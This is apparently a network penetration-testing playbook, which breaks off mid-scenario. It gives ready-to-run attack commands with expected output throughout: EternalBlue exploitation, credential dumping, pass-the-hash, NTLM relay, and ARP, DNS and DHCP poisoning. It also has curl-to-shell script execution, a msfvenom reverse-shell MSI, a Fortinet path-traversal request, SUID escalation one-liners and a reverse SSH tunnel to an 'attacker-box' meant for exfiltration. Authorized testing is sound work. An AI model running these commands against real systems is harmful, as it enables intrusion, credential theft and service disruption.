
## Methodology Overview

Network penetration testing assesses the security of network infrastructure, systems, and services by simulating real-world attack scenarios using the MITRE ATT&CK Enterprise framework as the tactical baseline.

---

## MITRE ATT&CK Enterprise Matrix Integration

**Discovery:** `standards/frameworks/mitre-atlas/` — controls.yaml, questions.yaml
**Coverage:** Complete enterprise tactics, techniques, and procedures

### Enterprise Tactics (Attack Lifecycle)

1. **Reconnaissance** (TA0043) - Gather information for targeting
2. **Resource Development** (TA0042) - Establish resources for operations
3. **Initial Access** (TA0001) - Gain foothold in network
4. **Execution** (TA0002) - Run malicious code
5. **Persistence** (TA0003) - Maintain access
6. **Privilege Escalation** (TA0004) - Gain higher-level permissions
7. **Defense Evasion** (TA0005) - Avoid detection
8. **Credential Access** (TA0006) - Steal credentials
9. **Discovery** (TA0007) - Explore environment
10. **Lateral Movement** (TA0008) - Move through network
11. **Collection** (TA0009) - Gather data of interest
12. **Command and Control** (TA0011) - Communicate with compromised systems
13. **Exfiltration** (TA0010) - Steal data
14. **Impact** (TA0040) - Disrupt/destroy systems

---

## NIST SP 800-115 Testing Phases

**Reference:** https://csrc.nist.gov/publications/detail/sp/800-115/final (use WebFetch)
**Pages:** 80 (split into 10-page chunks)

### Phase 1: Planning
- Define scope and objectives
- Identify target systems and networks
- Establish rules of engagement
- Obtain necessary approvals

### Phase 2: Discovery (Reconnaissance)
- **Active Scanning:** Port scanning, service enumeration
- **Passive Scanning:** Traffic monitoring, OSINT
- **Network Mapping:** Topology discovery, subnet identification
- **Service Identification:** Banner grabbing, version detection

### Phase 3: Attack (Exploitation)
- **Vulnerability Exploitation:** Known CVEs, misconfigurations
- **Password Attacks:** Brute force, password spraying, credential stuffing
- **Social Engineering:** Phishing, pretexting (if in scope)
- **Privilege Escalation:** Local/domain privilege escalation

### Phase 4: Reporting
- Document findings with evidence
- Map to MITRE ATT&CK techniques
- Provide remediation recommendations
- Include executive summary

---

## Tool Usage Guide

### Reconnaissance & Discovery Tools

#### 1. Nmap - Network Scanner

**Purpose:** Port scanning, service enumeration, OS detection

**Basic Port Scan:**
```bash
nmap -sS -p- -T4 -oN nmap-scan.txt 192.168.1.0/24
```

**Options:**
- `-sS`: SYN stealth scan
- `-p-`: Scan all 65535 ports
- `-T4`: Aggressive timing (faster)
- `-oN`: Save output to file

**Expected Output:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
```

**Parsing:**
Look for "open" ports, note unusual high ports (>1024)

---

**Service Version Detection:**
```bash
nmap -sV -sC -p 22,80,443,3306 -oN nmap-services.txt 192.168.1.10
```

**Options:**
- `-sV`: Probe open ports to determine service/version
- `-sC`: Run default NSE scripts
- `-p`: Specific ports to scan

**Expected Output:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    nginx 1.14.0
443/tcp  open  https   nginx 1.14.0
3306/tcp open  mysql   MySQL 5.7.29
```

**Parsing:**
- Note versions for CVE lookup (e.g., OpenSSH 7.4 → check CVE database)
- Default scripts may reveal additional info (SSH keys, HTTP methods)

---

**Vulnerability Scanning:**
```bash
nmap --script vuln -p 22,80,443,3306 -oN nmap-vulns.txt 192.168.1.10
```

**Expected Output:**
```
| http-vuln-cve2017-5638:
|   VULNERABLE:
|   Apache Struts Remote Code Execution
|     State: VULNERABLE
|     Risk factor: High
```

**Parsing:**
Look for "VULNERABLE" keyword, note CVE IDs for exploitation research

---

#### 2. Masscan - Fast Port Scanner

**Purpose:** Rapid scanning of large IP ranges

**Command:**
```bash
masscan -p1-65535 10.0.0.0/8 --rate=10000 -oL masscan-results.txt
```

**Options:**
- `-p1-65535`: All ports
- `--rate=10000`: 10,000 packets per second
- `-oL`: List output format

**Expected Output:**
```
open tcp 22 10.0.1.50 1234567890
open tcp 80 10.0.1.51 1234567891
open tcp 443 10.0.1.51 1234567892
```

**Parsing:**
Extract IPs with open ports, feed to Nmap for detailed scanning

---

#### 3. DNS Enumeration

**DNSRecon:**
```bash
dnsrecon -d example.com -t std
```

**Expected Output:**
```
[*] A example.com 93.184.216.34
[*] MX example.com mail.example.com 10
[*] NS example.com ns1.example.com
[*] NS example.com ns2.example.com
```

**Parsing:**
Collect subdomains, mail servers, name servers for further testing

---

**Subdomain Brute Force:**
```bash
dnsrecon -d example.com -D /usr/share/wordlists/subdomains.txt -t brt
```

**Expected Output:**
```
[*] A mail.example.com 93.184.216.35
[*] A vpn.example.com 93.184.216.36
[*] A admin.example.com 93.184.216.37
```

**Parsing:**
Discovered subdomains expand attack surface (test vpn, admin, dev, staging)

---

### Exploitation Tools

#### 4. Metasploit Framework

**Purpose:** Exploitation framework with modules for known vulnerabilities

**Basic Usage:**
```bash
# Start msfconsole
msfconsole

# Search for exploit
msf6 > search ms17-010

# Use exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > exploit
```

**Expected Output (Success):**
```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] 192.168.1.50:445 - Connecting to target for exploitation
[*] 192.168.1.50:445 - Connection established for exploitation
[+] 192.168.1.50:445 - Target is vulnerable!
[*] Sending stage (200262 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened
meterpreter >
```

**Parsing:**
- `[+] Target is vulnerable` = Exploit succeeded
- `Meterpreter session X opened` = Shell access gained

---

#### 5. SQLMap - SQL Injection Tool

**Purpose:** Automated SQL injection and database takeover

**Command:**
```bash
sqlmap -u "http://example.com/page?id=1" --batch --dbs
```

**Options:**
- `-u`: Target URL
- `--batch`: Never ask for user input (use default)
- `--dbs`: Enumerate databases

**Expected Output:**
```
[*] information_schema
[*] mysql
[*] production_db
[*] test_db
```

**Parsing:**
Database names revealed = SQL injection confirmed, high severity

---

**Dump Tables:**
```bash
sqlmap -u "http://example.com/page?id=1" -D production_db --tables
```

**Expected Output:**
```
Database: production_db
[5 tables]
+-------------+
| users       |
| passwords   |
| credit_cards|
| sessions    |
| logs        |
+-------------+
```

**Parsing:**
Sensitive table names (users, passwords, credit_cards) = data breach risk

---

### Post-Exploitation Tools

#### 6. Impacket Suite

**Purpose:** Python scripts for SMB, RPC, Kerberos attacks

**GetNPUsers.py (AS-REP Roasting):**
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.10
```

**Expected Output:**
```
$krb5asrep$23$svc_account@DOMAIN.LOCAL:hash_here...
```

**Parsing:**
Kerberos hash captured = offline brute force possible

---

**SecretsDump.py (Credential Dumping):**
```bash
secretsdump.py domain/admin:password@192.168.1.10
```

**Expected Output:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Parsing:**
NTLM hashes extracted = pass-the-hash attacks possible

---

#### 7. BloodHound - AD Attack Path Mapping

**Purpose:** Graph-based Active Directory analysis for privilege escalation

**Data Collection (SharpHound):**
```bash
# On compromised Windows system
SharpHound.exe -c All -d domain.local
```

**Expected Output:**
```
[*] Initializing SharpHound at 10:30 AM on 2026-01-18
[*] Resolved Collection Methods: Group, LocalAdmin, Session, Trusts
[*] Done writing 20231018103045_BloodHound.zip to output directory
```

**BloodHound Analysis:**
```bash
# Import ZIP into BloodHound GUI
# Query: "Shortest Paths to Domain Admins from Owned Principals"
```

**Parsing:**
- Attack paths visualized
- Identify privilege escalation routes
- Find misconfigured ACLs, group memberships

---

### Lateral Movement Tools

#### 8. CrackMapExec

**Purpose:** Post-exploitation tool for Windows networks

**SMB Enumeration:**
```bash
crackmapexec smb 192.168.1.0/24 -u admin -p password
```

**Expected Output:**
```
SMB    192.168.1.10   445   DC01   [+] domain\admin:password (Pwn3d!)
SMB    192.168.1.11   445   WEB01  [+] domain\admin:password
SMB    192.168.1.12   445   DB01   [-] domain\admin:password (STATUS_LOGON_FAILURE)
```

**Parsing:**
- `(Pwn3d!)` = Admin access confirmed
- Multiple hosts with same creds = credential reuse

---

**Pass-the-Hash:**
```bash
crackmapexec smb 192.168.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

**Expected Output:**
```
SMB    192.168.1.10   445   DC01   [+] domain\admin:31d6cfe... (Pwn3d!)
```

**Parsing:**
Hash accepted = no password needed for lateral movement

---

### Credential Access Tools

#### 9. Responder - LLMNR/NBT-NS Poisoning

**Purpose:** Capture NetNTLMv2 hashes via network poisoning

**Command:**
```bash
responder -I eth0 -wrf
```

**Options:**
- `-I eth0`: Interface
- `-w`: WPAD rogue proxy server
- `-r`: Enable LLMNR answers
- `-f`: Force authentication

**Expected Output:**
```
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.50
[HTTP] NTLMv2 Username : DOMAIN\john
[HTTP] NTLMv2 Hash     : john::DOMAIN:1122334455667788:hash_here...
```

**Parsing:**
NetNTLMv2 hash captured = crack offline with Hashcat

---

#### 10. Hashcat - Password Cracking

**Purpose:** Offline password hash cracking

**NTLM Hash Cracking:**
```bash
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Options:**
- `-m 1000`: NTLM mode
- `-a 0`: Dictionary attack
- `hashes.txt`: File with captured hashes
- `rockyou.txt`: Wordlist

**Expected Output:**
```
31d6cfe0d16ae931b73c59d7e0c089c0:Password123
aad3b435b51404eeaad3b435b51404ee:Admin@2024
```

**Parsing:**
`hash:plaintext` = password recovered

---

**NetNTLMv2 Cracking:**
```bash
hashcat -m 5600 -a 0 ntlmv2-hashes.txt /usr/share/wordlists/rockyou.txt
```

**Expected Output:**
```
john::DOMAIN:1122334455667788:hash...:Welcome2024
```

---

#### 11. Nuclei - Vulnerability Scanner

**Purpose:** Template-based vulnerability scanning with community-maintained checks

**Basic Scan:**
```bash
nuclei -u https://target.com -t /root/nuclei-templates/
```

**Options:**
- `-u`: Target URL
- `-t`: Template directory
- `-severity critical,high`: Filter by severity
- `-o`: Output file

**Scan Multiple Targets:**
```bash
nuclei -l targets.txt -t /root/nuclei-templates/cves/ -severity critical
```

**Expected Output:**
```
[CVE-2021-44228] Log4j RCE detected on https://target.com:8080
[CVE-2020-1472] Zerologon vulnerability on DC01.domain.local
```

**Parsing:**
Prioritize critical/high findings, validate with manual testing

---

#### 12. tcpdump - Network Traffic Capture

**Purpose:** Command-line packet analyzer for network traffic inspection

**Basic Capture:**
```bash
tcpdump -i eth0 -w capture.pcap
```

**Options:**
- `-i`: Interface (eth0, wlan0, any)
- `-w`: Write to file
- `-r`: Read from file
- `-n`: Don't resolve hostnames
- `-A`: Print packets in ASCII
- `-X`: Print in hex and ASCII

**Filter by Protocol:**
```bash
tcpdump -i eth0 'tcp port 80' -w http-traffic.pcap
```

**Capture SMB Traffic:**
```bash
tcpdump -i eth0 'port 445 or port 139' -w smb-traffic.pcap
```

**Read and Filter:**
```bash
tcpdump -r capture.pcap 'src 192.168.1.100 and dst port 443' -A
```

**Expected Output:**
```
10:30:15.123456 IP 192.168.1.100.52345 > 10.0.0.50.445: Flags [S], seq 1234567890
10:30:15.124567 IP 10.0.0.50.445 > 192.168.1.100.52345: Flags [S.], seq 9876543210, ack 1234567891
```

**Parsing:**
Identify unencrypted traffic (HTTP, FTP, Telnet), analyze authentication flows

---

#### 13. tshark - Terminal Wireshark

**Purpose:** Command-line version of Wireshark for advanced packet analysis

**Basic Capture:**
```bash
tshark -i eth0 -w capture.pcap
```

**Display Filters:**
```bash
tshark -r capture.pcap -Y 'http.request.method == "POST"'
```

**Options:**
- `-i`: Interface
- `-r`: Read pcap file
- `-Y`: Display filter
- `-T`: Output format (json, text, fields)
- `-e`: Fields to extract

**Extract HTTP Credentials:**
```bash
tshark -r traffic.pcap -Y 'http.authbasic' -T fields -e http.authbasic
```

**SMB Analysis:**
```bash
tshark -r smb-traffic.pcap -Y 'smb2.cmd == 1' -T fields -e smb2.filename
```

**Expected Output:**
```
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
\\\\server\\share\\confidential.docx
```

**Parsing:**
Decode Base64 credentials, identify file access patterns, analyze authentication

---

#### 14. Wireshark - Protocol Analyzer

**Purpose:** GUI-based packet capture and protocol analysis

**Basic Capture:**
```
1. Interface selection: Capture > Options > Select interface (eth0, wlan0)
2. Start capture: Green shark fin icon
3. Stop capture: Red square icon
4. Save: File > Save As > capture.pcap
```

**Display Filters (Common):**
```
ip.addr == 192.168.1.100         # Traffic to/from specific IP
tcp.port == 445                   # SMB traffic
http                              # HTTP traffic only
smb2                              # SMB version 2 traffic
kerberos                          # Kerberos authentication
ntlmssp                           # NTLM authentication
dns                               # DNS queries/responses
arp                               # ARP requests/replies
icmp                              # ICMP (ping) traffic
```

**Advanced Filters:**
```
tcp.flags.syn == 1 && tcp.flags.ack == 0   # SYN packets (port scans)
http.request.method == "POST"               # HTTP POST requests
smb2.filename contains "password"           # SMB file access with keyword
ntlmssp.auth.username                       # Extract NTLM usernames
kerberos.CNameString                        # Extract Kerberos principal names
```

**Follow Streams:**
```
Right-click packet > Follow > TCP Stream    # View full TCP conversation
Right-click packet > Follow > HTTP Stream   # View HTTP request/response
Right-click packet > Follow > SSL Stream    # View SSL/TLS (if decrypted)
```

**Export Objects:**
```
File > Export Objects > HTTP    # Extract files transferred via HTTP
File > Export Objects > SMB     # Extract files from SMB shares
```

**Statistics & Analysis:**
```
Statistics > Protocol Hierarchy       # Protocol distribution
Statistics > Conversations            # Traffic between hosts
Statistics > Endpoints                # Active hosts and traffic
Statistics > IO Graph                 # Traffic over time
```

**Expected Analysis:**
```
# Identify:
- Unencrypted credentials (HTTP, FTP, Telnet, SMB)
- Authentication attempts (NTLM, Kerberos)
- File transfers and data exfiltration
- Network reconnaissance (port scans, ARP scans)
- Malicious traffic patterns
```

**Parsing:**
Use filters to isolate suspicious traffic, export credentials, analyze authentication flows

---

#### 15. SSH Tunneling & Pivoting

**Purpose:** Network pivoting and port forwarding through compromised hosts

**Local Port Forward:**
```bash
ssh -L 8080:internal-server:80 user@jump-host
```

**Explanation:**
- Forwards local port 8080 to internal-server:80 through jump-host
- Access via: http://localhost:8080

**Dynamic Port Forward (SOCKS Proxy):**
```bash
ssh -D 9050 user@jump-host
```

**Use with ProxyChains:**
```bash
# Edit /etc/proxychains.conf:
# socks5 127.0.0.1 9050

proxychains nmap -sT -Pn 10.10.10.0/24
proxychains curl http://internal-web-server
```

**Remote Port Forward:**
```bash
ssh -R 8080:localhost:80 user@attacker-box
```

**Explanation:**
- Exposes attacker's port 80 on victim's port 8080
- Useful for exfiltration and reverse shells

**Persistent Tunnel:**
```bash
autossh -M 20000 -f -N -L 8080:internal:80 user@jump-host
```

**Expected Output:**
```
# Successful tunnel:
ssh user@jump-host -L 8080:internal:80
user@jump-host's password:
(no output = success, tunnel active)

# Test access:
curl http://localhost:8080
(receives response from internal:80)
```

**Parsing:**
Verify tunnel connectivity, test internal services, enumerate internal network

---

#### 16. ProxyChains - Traffic Routing

**Purpose:** Route traffic through SOCKS/HTTP proxies for pivoting

**Configuration:**
```bash
# Edit /etc/proxychains.conf
dynamic_chain          # Try proxies in order, skip dead ones
proxy_dns              # DNS requests through proxy
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 9050  # SSH SOCKS tunnel
socks4 10.10.10.5 1080 # Internal SOCKS proxy
```

**Basic Usage:**
```bash
proxychains nmap -sT -Pn target-behind-proxy
```

**Options:**
- `-sT`: TCP connect scan (SOCKS compatible)
- `-Pn`: Skip ping (through proxy)
- No SYN scan (not supported through proxies)

**Enumeration Through Proxy:**
```bash
proxychains enum4linux -a 10.10.10.50
proxychains smbclient -L //10.10.10.50
proxychains crackmapexec smb 10.10.10.0/24
```

**Expected Output:**
```
[proxychains] Strict chain ... 127.0.0.1:9050 ... 10.10.10.50:445 ... OK
SMB 10.10.10.50 445 DC01 [*] Windows Server 2019 (name:DC01) (domain:CORP)
```

**Parsing:**
Verify proxy chain success, enumerate through pivots, map internal networks

---

#### 17. Enum4linux - SMB/CIFS Enumeration

**Purpose:** Comprehensive SMB and Windows domain enumeration

**Full Enumeration:**
```bash
enum4linux -a 192.168.1.10
```

**Options:**
- `-a`: All enumeration
- `-U`: Users
- `-G`: Groups
- `-S`: Shares
- `-P`: Password policy
- `-o`: OS information

**Targeted Enumeration:**
```bash
enum4linux -U -G -S 192.168.1.10
```

**Expected Output:**
```
[+] Domain: CORP
[+] Domain SID: S-1-5-21-1234567890-...

[+] Users:
Administrator
Guest
krbtgt
sql_service

[+] Shares:
ADMIN$    Disk    Remote Admin
C$        Disk    Default share
IPC$      IPC     Remote IPC
Backup    Disk    Backup Files

[+] Password policy:
Minimum password length: 7
Password complexity: Enabled
Lockout threshold: 5
```

**Parsing:**
Identify service accounts (sql_, svc_), test accessible shares, note weak password policies

---

### Post-Exploitation Enumeration Scripts

#### Linux Enumeration & Privilege Escalation

**LinPEAS (Linux Privilege Escalation Awesome Script):**
```bash
# Download and execute
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer and run
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a > linpeas_output.txt

# Key checks:
# - SUID binaries
# - Writable /etc/passwd
# - Sudo misconfigurations (NOPASSWD)
# - Kernel exploits
# - Cron jobs with writable scripts
# - Capabilities
# - Docker socket exposure
```

**LinEnum:**
```bash
# Download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh

# Run with thorough checks
./LinEnum.sh -t -r report.txt

# Expected output:
[+] SUID files:
/usr/bin/passwd
/usr/bin/find (VULNERABLE)
/custom/suid_binary (INVESTIGATE)

[+] Sudo version: 1.8.21 (CVE-2021-3156 VULNERABLE)
```

**Linux Smart Enumeration (LSE):**
```bash
# Download and run
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | bash

# Run with level 1 (detailed)
./lse.sh -l 1

# Run with level 2 (very detailed, slow)
./lse.sh -l 2 -i

# Key findings:
# - Writeable directories in PATH
# - NFS shares with no_root_squash
# - Weak file permissions
# - Interesting files (passwords, keys)
```

**pspy (Process monitoring without root):**
```bash
# Download
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64

# Monitor processes
./pspy64

# Expected output:
CMD: /usr/bin/backup.sh
CMD: /root/cleanup.sh (running as root, check if writable)
```

---

#### Windows Enumeration & Privilege Escalation

**WinPEAS (Windows Privilege Escalation Awesome Script):**
```powershell
# Download and execute
iwr https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winpeas.exe
.\winpeas.exe

# Run with all checks
.\winpeas.exe cmd > winpeas_output.txt

# Key checks:
# - Unquoted service paths
# - Weak service permissions
# - AlwaysInstallElevated
# - Autologon credentials
# - Saved credentials (cmdkey)
# - Scheduled tasks with writable binaries
```

**PowerUp (PowerSploit):**
```powershell
# Download
iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -OutFile PowerUp.ps1

# Load and run all checks
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Specific checks
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceUnquoted

# Expected output:
[+] Unquoted Service Path: C:\Program Files\Vulnerable App\service.exe
[+] Writable Service Binary: C:\Services\backup.exe
[+] AlwaysInstallElevated: Enabled (VULNERABLE)
```

**Seatbelt (Situational Awareness):**
```powershell
# Download
iwr https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe -OutFile Seatbelt.exe

# Run all checks
.\Seatbelt.exe -group=all

# Run specific checks
.\Seatbelt.exe -group=system
.\Seatbelt.exe -group=user
.\Seatbelt.exe Processes,Services,Users

# Expected output:
[+] Autologon Credentials:
    DefaultUserName: admin
    DefaultPassword: Welcome2024!

[+] Saved RDP Credentials:
    10.10.10.50
    172.16.0.100
```

**SharpUp (C# version of PowerUp):**
```powershell
# Run compiled binary
.\SharpUp.exe audit

# Expected output:
[+] Modifiable Services:
    VulnService - C:\Services\vuln.exe

[+] Modifiable Scheduled Tasks:
    Backup - C:\Scripts\backup.bat (writable)
```

**AccessChk (Sysinternals):**
```powershell
# Download
iwr https://live.sysinternals.com/accesschk.exe -OutFile accesschk.exe

# Check service permissions
.\accesschk.exe -uwcqv "Authenticated Users" *
.\accesschk.exe -uwcqv "Everyone" *

# Expected output:
RW VulnService
  SERVICE_ALL_ACCESS

# Check writable directories
.\accesschk.exe -uwdqs "Authenticated Users" C:\
.\accesschk.exe -uwdqs Users C:\
```

---

#### Common Privilege Escalation Vectors

**Linux SUID/SGID Exploitation:**
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Common SUID exploits:
# - /usr/bin/find (GTFOBins)
# - /usr/bin/vim (GTFOBins)
# - /usr/bin/python (GTFOBins)
# - Custom SUID binaries

# Example: find SUID escalation
find . -exec /bin/sh -p \; -quit
```

**Linux Capabilities:**
```bash
# Find files with capabilities
getcap -r / 2>/dev/null

# Expected vulnerable output:
/usr/bin/python3.8 = cap_setuid+ep

# Exploit cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Windows Unquoted Service Path:**
```powershell
# Find unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Expected output:
VulnService    C:\Program Files\Vulnerable App\service.exe    Automatic

# Exploit by placing binary at:
# C:\Program.exe (tried first)
# C:\Program Files\Vulnerable.exe (tried second)
# C:\Program Files\Vulnerable App\service.exe (original)
```

**Windows AlwaysInstallElevated:**
```powershell
# Check registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are set to 1, exploit:
# Create malicious MSI with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi -o malicious.msi

# Install as SYSTEM
msiexec /quiet /qn /i malicious.msi
```

---

### Network Exploitation Examples

#### Scenario 1: SMB Null Session Enumeration

```bash
# Test for null session
smbclient -L //192.168.1.10 -N

# Expected if vulnerable:
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

**Impact:** Anonymous access to share listings

---

#### Scenario 2: Kerberoasting Attack

```bash
# Request service tickets
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.10 -request

# Expected output:
$krb5tgs$23$*svc_sql$DOMAIN.LOCAL$MSSQLSvc...:hash...

# Crack with Hashcat
hashcat -m 13100 -a 0 kerberos-hashes.txt wordlist.txt
```

**Impact:** Service account passwords extracted offline

---

#### Scenario 3: NTLM Relay Attack

```bash
# Start ntlmrelayx to relay to target
ntlmrelayx.py -t smb://192.168.1.50 -smb2support

# Wait for authentication (trigger with Responder or social engineering)

# Expected output:
[*] SMBD: Received connection from 192.168.1.100
[*] Authenticating against smb://192.168.1.50 as DOMAIN\admin SUCCEED
[*] SMB Session established, uploading payload...
```

**Impact:** Authentication relay = remote code execution

---

#### Scenario 4: ARP Spoofing/Poisoning

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof (man-in-the-middle)
arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1

# Expected output:
8:0:27:12:34:56 192.168.1.1 is-at aa:bb:cc:dd:ee:ff
8:0:27:12:34:56 192.168.1.100 is-at aa:bb:cc:dd:ee:ff

# Capture traffic with tcpdump
tcpdump -i eth0 -w mitm-capture.pcap

# Alternative: Ettercap for GUI-based MITM
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
```

**Impact:** Man-in-the-middle position, intercept unencrypted traffic, credential capture

**Mitigation:** Dynamic ARP Inspection (DAI), static ARP entries, port security

---

#### Scenario 5: VLAN Hopping Attack

```bash
# Method 1: Switch Spoofing (DTP exploitation)
# Configure interface to trunk mode
ip link add link eth0 name eth0.10 type vlan id 10
ip addr add 10.10.10.100/24 dev eth0.10
ip link set eth0.10 up

# Expected if successful:
# Access to VLAN 10 from VLAN 1

# Method 2: Double Tagging
# Requires crafted packets with two VLAN tags
# Send packet with:
#   - Outer tag: Native VLAN
#   - Inner tag: Target VLAN
# Tools: Scapy, Yersinia

# Yersinia for automated DTP attack
yersinia -G  # GUI mode
# Select DTP > enabling trunking
```

**Impact:** Access to isolated VLANs, bypass network segmentation

**Mitigation:** Disable DTP, explicitly configure trunk ports, disable unused ports

---

#### Scenario 6: DNS Spoofing/Cache Poisoning

```bash
# Method 1: Local DNS spoofing with dnschef
dnschef --fakeip 192.168.1.50 --interface 192.168.1.100

# Expected output:
[*] DNSChef started on interface: 192.168.1.100
[*] Cooking all DNS queries with 192.168.1.50

# Method 2: DNS cache poisoning with ettercap
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.100//

# Configure /etc/ettercap/etter.dns:
# example.com A 192.168.1.50
# *.example.com A 192.168.1.50

# Verify spoofing
dig @192.168.1.100 example.com
nslookup example.com 192.168.1.100
```

**Impact:** Redirect traffic to malicious servers, phishing, credential harvesting

**Mitigation:** DNSSEC, DNS over HTTPS (DoH), DNS over TLS (DoT)

---

#### Scenario 7: DHCP Starvation Attack

```bash
# Exhaust DHCP pool with Yersinia
yersinia dhcp -attack 1 -interface eth0

# Expected output:
Sending DISCOVER packets...
DHCP pool exhausted: 192.168.1.100-192.168.1.254

# Alternative: DHCPig
pig.py eth0

# Expected impact:
# Legitimate clients cannot obtain IP addresses
# Attacker can become rogue DHCP server
```

**Rogue DHCP Server:**
```bash
# After starvation, provide malicious DHCP
# Configure attacker as DNS server to intercept traffic
dnsmasq --interface=eth0 --dhcp-range=192.168.1.100,192.168.1.200,12h \
        --dhcp-option=6,192.168.1.50  # Attacker as DNS
```

**Impact:** Denial of service, rogue DHCP server, traffic interception

**Mitigation:** DHCP snooping, port security, rate limiting

---

#### Scenario 8: IPv6 Attacks (Router Advertisement Flooding)

```bash
# IPv6 Router Advertisement flood
atk6-flood_router6 eth0

# Expected output:
Sending Router Advertisements...
Flooding network with fake IPv6 routers

# IPv6 MITM with Parasite6
parasite6 eth0

# Expected output:
[*] Started IPv6 SLAAC attack
[*] Fake router advertisements sent
[*] Clients using attacker as IPv6 gateway
```

**Impact:** IPv6 man-in-the-middle, traffic interception, DoS

**Mitigation:** RA Guard, IPv6 source guard, disable IPv6 if unused

---

#### Scenario 9: VPN/SSL VPN Exploitation

```bash
# Scan for VPN endpoints
nmap -sV -p 443,500,1194,1723 --script ssl-enum-ciphers target.com

# Expected output:
443/tcp  open  ssl/https  Fortinet SSL VPN
| ssl-enum-ciphers:
|   TLSv1.0: (VULNERABLE)
|     Ciphers: TLS_RSA_WITH_RC4_128_SHA

# Test for CVE-2018-13379 (Fortinet path traversal)
curl -k 'https://target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'

# Expected if vulnerable:
var fgt_lang = {
    "...": "session_data..."
}

# OpenVPN credential bruteforce
hydra -L users.txt -P passwords.txt target.com -s 1194 ovpn

# IPSec VPN scanning
ike-scan -M target.com
```

**Impact:** VPN credential theft, session hijacking, unauthorized access

**Mitigation:** Patch vulnerabilities, strong authentication, MFA, disable weak ciphers

---

#### Scenario 10: Network Printer Exploitation

```bash
# Discover network printers
nmap -p 9100,515,631 192.168.1.0/24

# SNMP enumeration (default community: public)
snmpwalk -v1 -c public 192.168.1.50

# Expected output:
iso.3.6.1.2.1.1.5.0 = STRING: "HP LaserJet Pro"
iso.3.6.1.4.1.11.2.3.9.1.1.7.0 = STRING: "admin:Welcome123"

# Print job interception (PRET framework)
python pret.py 192.168.1.50 pjl
PRET> get /etc/passwd

# PostScript injection
ps://192.168.1.50/
...malicious PostScript code...
```

**Impact:** Credential exposure, print job interception, printer compromise, lateral movement

**Mitigation:** Network segmentation, disable SNMP, authentication required, firmware updates

---

#### Scenario 11: RDP Exploitation

```bash
# RDP service discovery
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info 192.168.1.0/24

# Expected output:
3389/tcp open  ms-wbt-server
| rdp-enum-encryption:
|   Security layer: RDP Security (VULNERABLE)
|   RDP Encryption: 40-bit (VULNERABLE)
|   SSL Encryption: Supported
| rdp-ntlm-info:
|   Target_Name: CORP
|   Computer_Name: WINSERVER01

# Password spraying attack
hydra -L users.txt -P passwords.txt rdp://192.168.1.50

# BlueKeep (CVE-2019-0708) vulnerability check
nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.50

# RDP session hijacking (if local admin on terminal server)
tscon 2 /dest:console  # Hijack session ID 2

# Restricted Admin mode abuse (Pass-the-Hash over RDP)
xfreerdp /u:admin /pth:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c /v:192.168.1.50
```

**Impact:** Unauthorized remote access, credential theft, session hijacking, RCE (BlueKeep)

**Mitigation:** Network Level Authentication (NLA), MFA, account lockout policies, disable RDP where unnecessary, patch BlueKeep

---

#### Scenario 12: Database Direct Access

```bash
# MySQL enumeration
nmap -p 3306 --script mysql-info,mysql-enum 192.168.1.0/24

# Expected output:
3306/tcp open  mysql
| mysql-info:
|   Version: 5.7.33-0ubuntu0.18.04.1
|   Salt: xxxxx
